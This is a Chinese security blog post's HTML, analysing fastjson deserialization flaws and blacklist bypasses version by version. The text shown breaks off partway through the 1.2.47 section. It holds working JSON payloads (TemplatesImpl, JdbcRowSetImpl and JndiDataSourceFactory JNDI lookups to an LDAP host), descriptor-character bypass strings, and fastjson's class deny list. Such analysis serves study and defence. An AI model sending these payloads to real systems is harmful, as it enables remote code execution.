@@ -1,0 +1,1140 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>fastjson：我一路向北，离开有你的季节 | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              fastjson：我一路向北，离开有你的季节
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-03-22
+              </span>
+              <span>
+                35 min read
+              </span>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+                <a href="https://su18.org/tag/5oAmhd4uF/" class="post-tag">
+                  # fastjson
+                </a>
+              
+                <a href="https://su18.org/tag/f16FB3h4R/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://su18.org/tag/bbwakgnJvv/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/fastjson.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前言">前言</h1>
+<p>继续水一篇漏洞文。</p>
+<h1 id="一-简介">一、简介</h1>
+<p>fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。<br>
+由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第一次报告安全漏洞至今，进行了若干次的安全更新，也与安全研究人员进行了来来回回多次的安全补丁-绕过的流程。本文随是一篇漏洞学习水文，但胜在记录详细，并将会持续进行更新。</p>
+<h1 id="二-fastjson-使用">二、fastjson 使用</h1>
+<p>使用 fastjson 无非是将类转为 json 字符串或解析 json 转为 JavaBean。</p>
+<h2 id="1-将类转为-json">1. 将类转为 json</h2>
+<p>在这里我们最常用的方法就是 <code>JSON.toJSONString()</code> ，该方法有若干重载方法，带有不同的参数，其中常用的包括以下几个：</p>
+<ul>
+<li>序列化特性：<code>com.alibaba.fastjson.serializer.SerializerFeature</code>，可以通过设置多个特性到 <code>FastjsonConfig</code> 中全局使用，也可以在使用具体方法中指定特性。</li>
+<li>序列化过滤器：<code>com.alibaba.fastjson.serializer.SerializeFilter</code>，这是一个接口，通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化。</li>
+<li>序列化时的配置：<code>com.alibaba.fastjson.serializer.SerializeConfig</code> ，可以添加特点类型自定义的序列化配置。</li>
+</ul>
+<h2 id="2-将-json-反序列化为类">2. 将 json 反序列化为类</h2>
+<p>将 json 数据反序列化时常使用的方法为<code>parse()</code>、<code>parseObject()</code>、<code>parseArray()</code>，这三个方法也均包含若干重载方法，带有不同参数：</p>
+<ul>
+<li>反序列化特性：<code>com.alibaba.fastjson.parser.Feature</code>，</li>
+<li>类的类型：<code>java.lang.reflect.Type</code>，用来执行反序列化类的类型。</li>
+<li>处理泛型反序列化：<code>com.alibaba.fastjson.TypeReference</code>。</li>
+<li>编程扩展定制反序列化：<code>com.alibaba.fastjson.parser.deserializer.ParseProcess</code>，例如<code>ExtraProcessor</code> 用于处理多余的字段，<code>ExtraTypeProvider</code> 用于处理多余字段时提供类型信息。</li>
+</ul>
+<p>先贴一下从大佬博客中拿来的早期版本的 fastjson 的框架图：</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1616458393831.png" alt="" loading="lazy"></figure>
+<p>这里列举一些 fastjson 功能要点：</p>
+<ul>
+<li>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的class。</li>
+<li>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第4位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中。</li>
+<li>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。</li>
+<li>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</li>
+<li>fastjson 在为类属性寻找 get/set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</li>
+<li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li>
+</ul>
+<h1 id="三-漏洞分析">三、漏洞分析</h1>
+<h2 id="1-fastjson-1224">1. fastjson-1.2.24</h2>
+<p>在2017年3月15日，fastjson官方主动爆出在 1.2.24 及之前版本存在远程代码执行高危安全漏洞。</p>
+<blockquote>
+<p>影响版本：<code>fastjson &lt;= 1.2.24</code><br>
+描述：fastjson 默认使用 <code>@type</code> 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter/setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。</p>
+</blockquote>
+<p><strong>TemplatesImpl 反序列化</strong></p>
+<p>TemplatesImpl 类位于<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，实现了 <code>Serializable</code> 接口，因此它可以被序列化，我们来看一下漏洞触发点。</p>
+<p>首先我们注意到该类中存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化。</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1616390254218.png" alt="" loading="lazy"></figure>
+<p>而类中的 <code>getOutputProperties()</code> 方法调用 <code>newTransformer()</code> 方法，而 <code>newTransformer()</code> 又调用了 <code>getTransletInstance()</code> 方法。</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1616390791003.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1616390984576.png" alt="" loading="lazy"></figure>
+<p>而 <code>getOutputProperties()</code> 方法就是类成员变量 <code>_outputProperties</code> 的 getter 方法。</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1616391295026.png" alt="" loading="lazy"></figure>
+<p>这就给了我们调用链，那 <code>_class</code> 中的类是否可控呢？看一下调用，发现在 <code> readObject</code>、构造方法以及 <code>defineTransletClasses()</code> 中有赋值的动作。</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1616391685378.png" alt="" loading="lazy"></figure>
+<p>其中 <code>defineTransletClasses()</code> 在 <code>getTransletInstance()</code> 中，如果 <code>_class</code> 不为空即会被调用，看一下 <code>defineTransletClasses()</code> 的逻辑：</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1616392154331.png" alt="" loading="lazy"></figure>
+<p>首先要求 <code>_bytecodes</code> 不为空，接着就会调用自定义的 ClassLoader 去加载 <code>_bytecodes</code> 中的 <code>byte[]</code> 。而 <code>_bytecodes</code> 也是该类的成员属性。</p>
+<p>而如果这个类的父类为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，就会将类成员属性的，<code>_transletIndex</code> 设置为当前循环中的标记位，而如果是第一次调用，就是<code>_class[0]</code>。如果父类不是这个类，将会抛出异常。</p>
+<p>那这样一条完整的漏洞调用链就呈现出来了：</p>
+<ul>
+<li>构造一个 TemplatesImpl 类的反序列化字符串，其中 <code>_bytecodes</code> 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 <code>newInstance()</code> 实例化。</li>
+<li>在反序列化过程中，由于getter方法 <code>getOutputProperties()</code>，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：<code>getOutputProperties()</code> -&gt;  <code>newTransformer()</code> -&gt; <code>getTransletInstance()</code> -&gt; <code>defineTransletClasses()</code> / <code>EvilClass.newInstance()</code>.</li>
+</ul>
+<p>其中，为了满足漏洞点触发之前不报异常及退出，我们还需要满足 <code>_name</code> 不为 null ，<code>_tfactory</code> 不为 null 。</p>
+<p>由于部分需要我们更改的私有变量没有 setter 方法，需要使用 <code>Feature.SupportNonPublicField</code> 参数。</p>
+<p>因此最终的 payload 为：</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
+	&quot;_bytecodes&quot;: [&quot;yv66vgAAADQA...CJAAk=&quot;],
+	&quot;_name&quot;: &quot;su18&quot;,
+	&quot;_tfactory&quot;: {},
+	&quot;_outputProperties&quot;: {},
+}
+</code></pre>
+<p><strong>JdbcRowSetImpl 反序列化</strong></p>
+<p>JdbcRowSetImpl 类位于 <code>com.sun.rowset.JdbcRowSetImpl</code> ，这条漏洞利用链比较好理解，是 <code>javax.naming.InitialContext#lookup()</code> 参数可控导致的 JNDI 注入。</p>
+<p>先看一下 <code>setAutoCommit()</code> 方法，在 <code>this.conn</code> 为空时，将会调用 <code>this.connect()</code> 方法。</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1616400334257.png" alt="" loading="lazy"></figure>
+<p>方法里调用了 <code>javax.naming.InitialContext#lookup()</code> 方法，参数从成员变量 <code>dataSource</code> 中获取。</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1616400975286.png" alt="" loading="lazy"></figure>
+<p>这时调用链就十分清晰了，最终的 payload 为：</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+	&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;,
+	&quot;autoCommit&quot;:true
+}
+</code></pre>
+<h2 id="2-fastjson-1225">2. fastjson-1.2.25</h2>
+<p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</p>
+<blockquote>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.41</code><br>
+描述：作者通过为危险功能添加开关，并提供黑白名单两种方式进行安全防护，其实已经是相当完整的防护思路，而且作者已经意识到黑名单类将会无穷无尽，仅仅通过维护列表来防止反序列化漏洞并非最好的办法。而且靠用户自己来关注安全信息去维护也不现实。</p>
+</blockquote>
+<p>安全更新主要集中在 <code>com.alibaba.fastjson.parser.ParserConfig</code>，首先查看类上出现了几个成员变量：布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1616459751324.png" alt="" loading="lazy"></figure>
+<p>其中黑名单 denyList 包括：</p>
+<pre><code class="language-Java">bsh
+com.mchange
+com.sun.
+java.lang.Thread
+java.net.Socket
+java.rmi
+javax.xml
+org.apache.bcel
+org.apache.commons.beanutils
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors
+org.apache.commons.collections4.comparators
+org.apache.commons.fileupload
+org.apache.myfaces.context.servlet
+org.apache.tomcat
+org.apache.wicket.util
+org.codehaus.groovy.runtime
+org.hibernate
+org.jboss
+org.mozilla.javascript
+org.python.core
+org.springframework
+</code></pre>
+<p>添加反序列化白名单有3种方法：</p>
+<ol>
+<li>使用代码进行添加：<code>ParserConfig.getGlobalInstance().addAccept(“org.su18.fastjson.,org.javaweb.”)</code></li>
+<li>加上JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=org.su18.fastjson.</code></li>
+<li>在fastjson.properties中添加：<code>fastjson.parser.autoTypeAccept=org.su18.fastjson.</code></li>
+</ol>
+<p>看一下 <code>checkAutoType()</code> 的逻辑，如果开启了 autoType，先判断类名是否在白名单中，如果在，就使用 <code>TypeUtils.loadClass</code> 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1616462597114.png" alt="" loading="lazy"></figure>
+<p>如果没开启 autoType ，则是先使用黑名单匹配，再使用白名单匹配和加载。最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或者 expectClass 不为空也就是指定了 Class 对象时才会调用 <code>TypeUtils.loadClass</code> 加载。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1616463143551.png" alt="" loading="lazy"></figure>
+<p>接着跟一下 <code>loadClass</code> ，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 <code>[</code>、<code>L</code>、<code>;</code> 字符。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1616463632814.png" alt="" loading="lazy"></figure>
+<p>因此就在这个位置出现了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符还会被处理掉。因此，漏洞利用的思路就出来了：需要开启 autoType，使用以上字符来进行黑名单的绕过。</p>
+<p>最终的 payload 其实就是在之前的 payload 类名上前后加上<code>L</code>和<code>;</code>即可：</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,
+	&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;,
+	&quot;autoCommit&quot;:true
+}
+</code></pre>
+<h2 id="3-fastjson-1242">3. fastjson-1.2.42</h2>
+<p>在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。</p>
+<blockquote>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code><br>
+描述：一点也不坦诚，学学人家 jackson，到现在还是明文黑名单。而且到目前为止很多类已经被撞出来了。</p>
+</blockquote>
+<p>还是关注 <code>com.alibaba.fastjson.parser.ParserConfig</code> 这个类，作者将原本的明文黑名单转为使用了 Hash 黑名单，防止安全人员对其研究。<br>
+<img src="https://su18.org/post-images/1616466267011.png" alt="" loading="lazy"></p>
+<p>并且在 checkAutoType 中加入判断，如果类的第一个字符是 <code>L</code> 结尾是 <code>;</code>，则使用 substring进行了去除。写判断也不好好写，非要写 hash 。<br>
+<img src="https://su18.org/post-images/1616466255355.png" alt="" loading="lazy"></p>
+<p>但是这种判断完全是徒劳的，因为在最后处理时是递归处理，因此只要对描述符进行双写即可绕过：</p>
+<pre><code class="language-java">{
+	&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,
+	&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;,
+	&quot;autoCommit&quot;:true
+}
+</code></pre>
+<h2 id="4-fastjson-1243">4. fastjson-1.2.43</h2>
+<p>这个版本主要是修复上一个版本中双写绕过的问题。</p>
+<blockquote>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.43</code><br>
+描述：上有政策，下有对策。在 <code>L</code>、<code>;</code> 被进行了限制后，安全研究人员将目光转向了 <code>[</code>。</p>
+</blockquote>
+<p>可以看到用来检查的 <code>checkAutoType</code> 代码添加了判断，如果类名连续出现了两个 <code>L</code> 将会抛出异常，</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1616469807043.png" alt="" loading="lazy"></figure>
+<p>这样使用 <code>L</code>、<code>;</code> 绕过黑名单的思路就被阻挡了，但是在 <code>loadClass</code> 的过程中，还针对 <code>[</code> 也进行了处理和递归，能不能利用 <code>[</code> 进行黑名单的绕过呢？</p>
+<p>答案当然是可以的：</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[,
+	{&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;,
+	&quot;autoCommit&quot;:true
+}
+</code></pre>
+<h2 id="5-fastjson-1244">5. fastjson-1.2.44</h2>
+<p>这个版本主要是修复上一个版本中使用 <code>[</code> 绕过黑名单防护的问题。</p>
+<blockquote>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.44</code><br>
+描述：在此版本将 <code>[</code> 也进行修复了之后，由字符串处理导致的黑名单绕过也就告一段落了。</p>
+</blockquote>
+<p>可以看到在 <code>checkAutoType</code> 中添加了新的判断，如果类名以 <code>[</code> 开始则直接抛出异常。</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1616475393707.png" alt="" loading="lazy"></figure>
+<h2 id="6-fastjson-1245">6. fastjson-1.2.45</h2>
+<p>在此版本爆出了一个黑名单绕过，实际上，黑名单是无穷无尽的，随着 fastjson 的版本更新，一定会有更多的黑名单爆出来，因为隔壁 jackson 都是明文黑名单的，只要隔壁一更新，大家都看到了，就会拿来看 fastjson。</p>
+<blockquote>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.45</code><br>
+描述：黑名单列表需要不断补充。</p>
+</blockquote>
+<pre><code class="language-json">{
+    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
+    &quot;properties&quot;:{
+        &quot;data_source&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;
+    }
+}
+</code></pre>
+<h2 id="7-fastjson-1247">7. fastjson-1.2.47</h2>
+<p>在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
+<blockquote>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32  未开启 AutoTypeSupport </code><br>
+影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code><br>
+描述：作者删除了一个 fastjson 的测试文件：<code>https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66</code> ，里面包含了这次通杀漏洞的 payload。</p>
+</blockquote>
+<p>这次的绕过问题还是出现在 <code>checkAutoType()</code> 方法中：</p>
+<pre><code class="language-java"> public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
+        // 类名非空判断
+        if (typeName == null) {
+            return null;
+        }
+        // 类名长度判断，不大于128不小于3
+        if (typeName.length() &gt;= 128 || typeName.length() &lt; 3) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+
+        String className = typeName.replace('$', '.');
+        Class&lt;?&gt; clazz = null;
+
+        final long BASIC = 0xcbf29ce484222325L; //;
+        final long PRIME = 0x100000001b3L;  //L
+
+        final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
+        // 类名以 [ 开头抛出异常
+        if (h1 == 0xaf64164c86024f1aL) { // [
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+        // 类名以 L 开头以 ; 结尾抛出异常
+        if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+
+        final long h3 = (((((BASIC ^ className.charAt(0))
+                * PRIME)
+                ^ className.charAt(1))
+                * PRIME)
+                ^ className.charAt(2))
+                * PRIME;
+        // autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项
+        if (autoTypeSupport || expectClass != null) {
+            long hash = h3;
+            for (int i = 3; i &lt; className.length(); ++i) {
+                hash ^= className.charAt(i);
+                hash *= PRIME;
+                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
+                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                    if (clazz != null) {
+                        return clazz;
+                    }
+                }
+                // 在对比 denyHashCodes 进行黑名单匹配
+                // 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类
+                // 则抛出异常
+                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+            }
+        }
+
+        // 尝试在 TypeUtils.mappings 中查找缓存的 class
+        if (clazz == null) {
+            clazz = TypeUtils.getClassFromMapping(typeName);
+        }
+
+        // 尝试在 deserializers 中查找这个类
+        if (clazz == null) {
+            clazz = deserializers.findClass(typeName);
+        }
+
+        // 如果找到了对应的 class，则会进行 return
+        if (clazz != null) {
+            if (expectClass != null
+                    &amp;&amp; clazz != java.util.HashMap.class
+                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            }
+
+            return clazz;
+        }
+
+        // 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致
+        if (!autoTypeSupport) {
+            long hash = h3;
+            for (int i = 3; i &lt; className.length(); ++i) {
+                char c = className.charAt(i);
+                hash ^= c;
+                hash *= PRIME;
+
+                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+
+                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
+                    if (clazz == null) {
+                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                    }
+
+                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                    }
+
+                    return clazz;
+                }
+            }
+        }
+        // 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类
+        if (clazz == null) {
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+        }
+
+        if (clazz != null) {
+            if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) {
+                return clazz;
+            }
+
+            if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
+                    || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
+                    ) {
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+            }
+
+            if (expectClass != null) {
+                if (expectClass.isAssignableFrom(clazz)) {
+                    return clazz;
+                } else {
+                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                }
+            }
+
+            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
+            if (beanInfo.creatorConstructor != null &amp;&amp; autoTypeSupport) {
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+            }
+        }
+
+        final int mask = Feature.SupportAutoType.mask;
+        boolean autoTypeSupport = this.autoTypeSupport
+                || (features &amp; mask) != 0
+                || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != 0;
+
+        if (!autoTypeSupport) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+
+        return clazz;
+    }
+</code></pre>
+<p>由以上代码可知，这里存在一个逻辑问题：autoTypeSupport 为 true 时，fastjson 也会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。这里就留下了一个伏笔。就是这个逻辑导致了 1.2.32 之前的版本将会受到 autoTypeSupport 的影响。</p>
+<p>在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以我们的关注点就在判断之前，程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。如何才能在这两步中将我们的恶意类加载进去呢？</p>
+<p>先看 deserializers ，位于 <code>com.alibaba.fastjson.parser.ParserConfig.deserializers</code> ，是一个 IdentityHashMap，能向其中赋值的函数有：</p>
+<ul>
+<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
+<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
+<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li>
+</ul>
+<p>因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 <code>TypeUtils.getClassFromMapping(typeName)</code>。</p>
+<p>同样的，这个方法从 <code>TypeUtils.mappings</code> 中取值，这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：</p>
+<ul>
+<li><code>addBaseClassMappings()</code>：无入参，加载</li>
+<li><code>loadClass()</code>：关键函数</li>
+</ul>
+<p>接下来看一下 <code>loadClass()</code> 的代码：</p>
+<pre><code class="language-java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
+        // 非空判断
+        if(className == null || className.length() == 0){
+            return null;
+        }
+        // 防止重复添加
+        Class&lt;?&gt; clazz = mappings.get(className);
+        if(clazz != null){
+            return clazz;
+        }
+        // 判断 className 是否以 [ 开头
+        if(className.charAt(0) == '['){
+            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+            return Array.newInstance(componentType, 0).getClass();
+        }
+        // 判断 className 是否 L 开头 ; 结尾
+        if(className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)){
+            String newClassName = className.substring(1, className.length() - 1);
+            return loadClass(newClassName, classLoader);
+        }
+        try{
+            // 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中
+            if(classLoader != null){
+                clazz = classLoader.loadClass(className);
+                if (cache) {
+                    mappings.put(className, clazz);
+                }
+                return clazz;
+            }
+        } catch(Throwable e){
+            e.printStackTrace();
+            // skip
+        }
+        // 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中
+        try{
+            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+            if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader){
+                clazz = contextClassLoader.loadClass(className);
+                if (cache) {
+                    mappings.put(className, clazz);
+                }
+                return clazz;
+            }
+        } catch(Throwable e){
+            // skip
+        }
+        // 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中
+        try{
+            clazz = Class.forName(className);
+            mappings.put(className, clazz);
+            return clazz;
+        } catch(Throwable e){
+            // skip
+        }
+        return clazz;
+    }
+</code></pre>
+<p>由以上代码可知，只要我们能够控制这个方法的参数，就可以往 mappings 中写入任意类名。<br>
+<code>loadClass</code> 一共有三个重载方法，如下图：</p>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1616544566230.png" alt="" loading="lazy"></figure>
+<p>我们需要找到调用这些方法的类，并看是否能够为我们控制：</p>
